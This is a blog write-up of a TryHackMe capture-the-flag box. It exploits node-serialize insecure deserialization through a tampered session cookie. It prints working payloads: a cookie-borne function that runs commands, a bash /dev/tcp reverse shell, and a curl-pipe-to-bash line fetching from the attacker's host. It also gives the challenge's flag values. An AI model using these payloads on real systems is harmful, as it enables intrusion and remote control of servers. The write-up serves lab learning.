---
title: "Jax sucks alot....."
date: 2026-04-16
category: "ctf"
excerpt: "Walkthrough of the TryHackMe ax sucks alot..... challenge - In JavaScript everything is a terrible mistake."
image: "/images/blog/79.png"
readtime: "20 min read"
draft: false
---

# Jax CTF

Horror LLC needs a pentest. Their words: "one of the scarier aspects of our company is our front-end webserver." Bold of them to admit that. The goal is to compromise the root account, no rules, good luck.

---

## Recon

Standard start. Run nmap and see what we are dealing with.

```bash
nmap -sCV 10.114.143.214
```

Two open ports: 22 and 80. SSH and a web server. Nothing fancy, so let's open the browser and see what is on port 80.

![](/images/blog/jax-sucks-alot/1.png)

It is a simple page. Horror LLC branding, a coming soon message, and an email input so you can sign up for updates. That is the whole site.

First thing I always do is check the page source.

```html
<h1>Horror LLC</h1>
<h4>Built with js</h4>
<br>
<h3>Coming soon! Please sign up to our newsletter to receive updates.</h3>
<br>
<h2>Email address:</h2>
<input type="text" id="fname" name="fname"><br><br>
<a class="button-line" id="signup">Submit</a>
<script>
document.getElementById("signup").addEventListener("click", function() {
  var date = new Date();
  date.setTime(date.getTime()+(-1*24*60*60*1000));
  var expires = "; expires="+date.toGMTString();
  document.cookie = "session=foobar"+expires+"; path=/";
  const Http = new XMLHttpRequest();
  console.log(location);
  const url=window.location.href+"?email="+document.getElementById("fname").value;
  Http.open("POST", url);
  Http.send();
  setTimeout(function() {
    window.location.reload();
  }, 500);
});
</script>
```

Two things jump out immediately.

First, there is a session cookie. The script sets it on the client side, which already smells funny. Second, whatever you type into the email field gets thrown directly into the URL as a query parameter with zero sanitization. Classic injection point.

---

## Cookie Tampering

My first instinct was to mess with the cookie. I changed the session value to `admin`, tried a few other guesses, nothing happened. Page just reloaded like normal.

Then I noticed something. When you actually type something into the email field and hit submit, the cookie that gets set is base64 encoded. Type `admin`, get back a base64 string. Decode it and there is your input wrapped in what looks like a JSON object.

Okay, so it is storing your email in the session cookie as a JSON object encoded in base64. That is interesting.

---

## Trying Injection

Since the email value ends up in the cookie, I figured maybe I could inject something that would get evaluated. I tried running this in the browser console:

```javascript
fetch("/?email=require('fs').readdirSync('.')", {method: "POST"})
  .then(() => console.log(atob(document.cookie.split('session=')[1])))
```

The idea here is to send a Node.js expression as the email value, fetch the page, then decode the cookie and see if the server actually ran anything. Spoiler: it did not. The value came back as a plain string. The server is just storing whatever you send, not executing it.

Fine. Let me try template injection then. I threw in a few classic payloads one by one:

- `{{7*7}}` is the Jinja2 / Twig template syntax. If the server is using one of those templating engines and is vulnerable, it evaluates the expression and returns `49` instead of the literal string.
- `#{7*7}` is the Ruby ERB / Slim syntax, same idea.
- `<%= 7*7 %>` is another ERB variant, also common in Node templating like EJS.

After each one I decoded the cookie to check if any of them returned `49`. None of them did. Just stored as plain text every time.

I was stuck here for a solid 10 minutes trying different things and getting nowhere.

---

## The Actual Vulnerability: node-serialize RCE

I stepped back and looked at what I knew. The app is built with Node.js, it is storing JSON in a cookie, and that JSON is being deserialized on the server side when the cookie is read.

I decided to search for any known vulnerabilities. And there is a known vulnerability in a Node.js package called `node-serialize`. When the library deserializes a JSON object, if a value contains a function wrapped in a specific format, it executes that function. This is insecure deserialization, and it is a very well documented CVE.

The magic wrapper looks like this:

```
_$$ND_FUNC$$_function(){ ... }()
```

Anything inside there gets executed on the server when the cookie is parsed. Now we are cooking.

---

## Confirming RCE with Ping

Before going straight to a reverse shell, let's confirm the vulnerability is actually there. Start listening for ICMP traffic on your machine:

```bash
tcpdump -i tun0 icmp
```

Then in the browser console, run this to set the cookie to a payload that pings your machine:

```javascript
document.cookie = "session=" + btoa('{"email":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ping -c 3 YOUR_TUN0_IP\')}()"}')
```

Replace `YOUR_TUN0_IP` with your actual tun0 address. You can check it with:

```bash
ip a show tun0
```

Refresh the page. If your tcpdump window starts showing ICMP packets coming in from the target, you have confirmed remote code execution. Green light.

---

## Getting a Reverse Shell

Time to actually get in. First create your reverse shell file on your machine:

```bash
echo 'bash -i >& /dev/tcp/YOUR_TUN0_IP/4444 0>&1' > shell.sh
```

Host it with a quick Python web server:

```bash
python3 -m http.server 8000
```

Open a netcat listener in another terminal:

```bash
nc -lvnp 4444
```

Now back in the browser console, set the cookie to a payload that curls your shell file and pipes it to bash:

```javascript
document.cookie = "session=" + btoa('{"email":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'curl http://YOUR_TUN0_IP:8000/shell.sh|bash\')}()"}')
```

![](/images/blog/jax-sucks-alot/2.png)

Refresh the page and switch to your netcat listener.

![](/images/blog/jax-sucks-alot/3.png)

You should have a shell.

---

## Flags

Once you are in, the first thing to check is what you can run with sudo:

```bash
sudo -l
```

![](/images/blog/jax-sucks-alot/4.png)

Turns out there are no restrictions at all. We can run everything as root. This makes the rest very easy.

Find and read the user flag:

```bash
sudo find / -name "user.txt"
```

It is at `/home/dylan/user.txt`.

```bash
cat /home/dylan/user.txt
```

![](/images/blog/jax-sucks-alot/5.png)

**Flag 1:** `0ba48780dee9f5677a4461f588af217c`

Same approach for root:

```bash
sudo find / -name "root.txt"
sudo cat /root/root.txt
```

![](/images/blog/jax-sucks-alot/6.png)

**Flag 2:** `2cd5a9fd3a0024bfa98d01d69241760e`

And that is the box.

---

## Takeaway

The thing that got me here was not the injection point or the cookie, it was recognizing the pattern: Node.js app, JSON in a cookie, deserialized on the server. Once I stopped chasing template injection and started thinking about what library might actually be handling that JSON, the CVE clicked into place.

The `node-serialize` vulnerability is old and well known but it still shows up. If you are building anything in Node and storing serialized objects in cookies, please do not use that package. Or at least do not deserialize user input. Actually just do not do any of this.

Horror LLC had every reason to be scared of their own webserver.

---
